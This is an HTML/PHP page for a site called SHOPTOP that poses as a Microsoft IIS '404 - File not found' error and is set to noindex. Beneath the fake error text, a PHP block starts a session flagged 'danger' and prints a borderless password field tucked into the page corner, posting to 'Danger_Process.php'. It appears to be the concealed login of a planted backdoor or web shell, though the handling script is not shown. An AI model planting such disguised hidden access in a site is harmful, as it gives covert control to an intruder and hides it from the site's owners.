<html>
<head>
<meta name="robots" content="noindex,nofollow">
<title>SHOPTOP - Page Not Found</title>
<style>
td
{
color:#000000;
font: 13pt/16pt verdana;
}
a
{
color:#FF0000;
}
a:hover
{
color:#000000;
}
#admin
{
 border:0px;
 bottom:0px;
 right:0px;
 position:absolute;
 width:200px;
}
</style>
</head>

<body bgcolor="FFFFFF">

<table width="540" height="550px;">

<tr>    
<td style="FONT: 30pt/35pt verdana;">The page cannot be found</td>
</tr>

<tr>
<td>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</td>
</tr>

<tr>
<td>
<p>Please try the following:</p>

<ul>
<li>If you typed the page address in the Address bar, make sure that it is spelled correctly.</li><br />
<li>Open the home page, and then look for links to the information you want.</li>
<li>Click the <a href="javascript:history.back(1)">Back</a> button to try another link.</li>
</ul>
    
<p>HTTP 404 - File not found</p>
<p>Internet Information Services</p>
<p>Technical Information (for support personnel)</p>

</td>
</tr>
  
</table>
<?php

session_start();
$_SESSION["danger"]=false;
echo '
<form action="Danger_Process.php" method="post">
<input type="password" name="admin" id="admin">
</form>';

?>
</body>
</html>